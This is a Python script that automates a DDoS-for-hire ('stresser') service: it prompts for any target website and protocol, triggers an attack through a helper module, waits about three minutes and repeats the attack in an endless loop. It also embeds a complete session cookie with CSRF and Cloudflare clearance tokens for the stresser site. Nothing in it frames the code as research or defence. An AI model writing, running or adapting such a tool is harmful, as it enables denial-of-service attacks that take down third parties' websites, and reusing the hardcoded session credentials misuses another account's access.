import asyncio

from colorama import *
from helpers.attack import Attack

class Stresser: 
    def __init__(self, cookie: str) -> None:
        self.cookie: str = cookie
        self.base_url = "https://stresser.su"
        
    def get_information() -> dict:
        website_url = input(f"{Fore.GREEN}[WEBSITE]{Fore.GREEN}{Fore.RESET} Enter the website url: ")
        method = input(f"{Fore.GREEN}[METHOD]{Fore.GREEN}{Fore.RESET} Enter the method (https/http): ")
        
        return {"website": website_url, "method": method}
        
    async def run(self, result: dict) -> bool:
        try:
            await Attack.start(self, result["website"], result["method"])
            await asyncio.sleep(185)
        except:
            return False
        
if __name__ == "__main__":  
    stresser_object: object = Stresser(cookie="")
    result: dict = Stresser.get_information()

    while True:
        asyncio.run(stresser_object.run(result=result))
        stresser_object: object = Stresser(cookie="UID=t2a8k29u6p6eth6bkibtn689te; _ga=GA1.1.805704553.1696953454; crisp-client%2Fsession%2F212f87a5-d7e6-42c1-94e7-7baa17b53f27=session_38c47f54-09e2-451e-a700-b38505ec6072; __RM=fcdfdded4459f157f358358723e46702rgh658t2a8k29u6p6eth6bkibtn689te6%242y%2410%24.Mw04c.1s3qMDgjVtn98w.Sfm%2FtdFARiGpgdN25AhP8JoIUsXEND.%2F%2Feb892382312f616214c666a444e1f15e; X-CSRF-TOKEN=%242y%2410%24Ysbfnku4tDeVaBAQ1b2Qre0pAjdej5bF.WkK1rnLZOOl8LhJg4bZ.; _ga_SSGSR26KRK=GS1.1.1696953453.1.1.1696954032.0.0.0; cf_clearance=m25i0ZGmcpoPmU6wFCNGqMAvTVEXu_5z8z50vXWHUpo-1696954032-0-1-10ce0e54.771894e8.562f9de2-0.2.1696954032")
